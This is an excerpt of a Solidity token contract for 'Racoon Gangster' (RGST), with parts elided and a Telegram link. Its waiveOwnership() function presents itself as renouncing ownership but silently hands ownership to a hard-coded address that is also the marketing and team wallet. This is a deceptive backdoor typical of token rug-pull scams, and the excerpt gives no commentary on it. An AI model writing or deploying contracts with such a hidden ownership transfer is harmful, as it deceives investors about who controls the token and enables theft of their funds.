...
/**
Telegram : https://t.me/RacoonGangster
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x447882643e0727E8F57010dC6aCADAbc63A8571a);
    }
...
contract RacoonGangster is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Racoon Gangster";
    string private _symbol = "RGST";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x447882643e0727E8F57010dC6aCADAbc63A8571a);
    address payable private teamWalletAddress = payable(0x447882643e0727E8F57010dC6aCADAbc63A8571a);
